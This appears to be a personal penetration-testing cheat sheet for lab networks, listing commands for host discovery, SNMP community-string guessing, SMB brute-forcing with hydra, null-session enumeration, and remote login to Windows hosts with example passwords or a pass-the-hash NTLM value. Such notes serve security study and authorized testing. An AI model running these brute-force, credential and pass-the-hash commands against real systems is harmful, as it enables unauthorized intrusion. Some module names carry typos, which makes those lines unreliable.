### Alive hosts
- `netdiscover -i tap0 -r 10.10.10.0/24`
- `arp-scan -I tap0 10.10.10.0/24`
- Identify targets in IP range `nbtscan -r 10.10.10.0/24`
- Perform reverse DNS queries `nmap -sL IP`
- Metasploit's 
	- SMB module can be used for enum windows system network `use auxilary/scanner/smb/smb_version`
	- SNMP module can also be used to enum info `use auxilary/scanner/snmp/smnp_login`
### SNMP
- Commin snmp community strings 
	-	onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.10.10.20 
	-	[seclists](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/common-snmp-community-strings.txt)
	-	common strings : `public` `private` 
- onesistyone `onesixtyone -c ./common-snmp-community-strings.txt 10.10.10.5`
- snmpwalk `snmpwalk -v 1 -c public 10.10.10.20`
- snmpenum.pl [http://dl.packetstormsecurity.net/UNIX/scanners/snmpenum.zip](http://dl.packetstormsecurity.net/UNIX/scanners/snmpenum.zip)
	- `perl snmpenum.pl 10.10.10.5 public windows.txt` (windows.txt in zip)

### SMB
- Bruteforce
	-	`hydra -L users.txt -P /usr/share/john/password.lst 10.10.10.20 smb -f -V`
- Netbios (TCP 139 | UDP 137 138)
	- [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brws/0c773bdd-78e2-4d8b-8b3d-b7506849847b?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brws/0c773bdd-78e2-4d8b-8b3d-b7506849847b?redirectedfrom=MSDN) 
	- Netbios can give us Hostname, Netbios name, Domain, Network Shares
	- UNC (Universal Naming Convention) paths `\\ServerName\ShareName\file.txt`
- Default administrative shares - `C$` C drive|`admin$` Windows installation|`ipc$` interprocess communication
- Null sessions 
	- `net view IP` `nmblookup -A ip` `smbclient -L //IP -N` `net use \\IP\C$ '' /u: ''` `smbclient //IP/$C -N` 
	- `enum -S IP` `enum -U IP` `enum -P IP`
	- `smbmap -H IP`

### SMB with creds/hashes
- Login with creds
	- `psexec.py administrator:Password1@10.0.0.10`
	- `smbexec.py administrator:carolina@10.0.0.169`
	- `winexe -U administrator%alice_123321 //10.0.0.6 'whoami'`
	- `evil-winrm -u administrator -p rocknroll_123321 -i 10.0.0.192`
- Login with hash
    - `pth-winexe -U user%NTLM_HASH //10.10.10.10 cmd.exe`
    - `python smbclient.py -hashes 00000000000000000000000000000000:3CAC6D4B3A7E5014E32EB12EF0C75476 Domain/Administrator@IP`
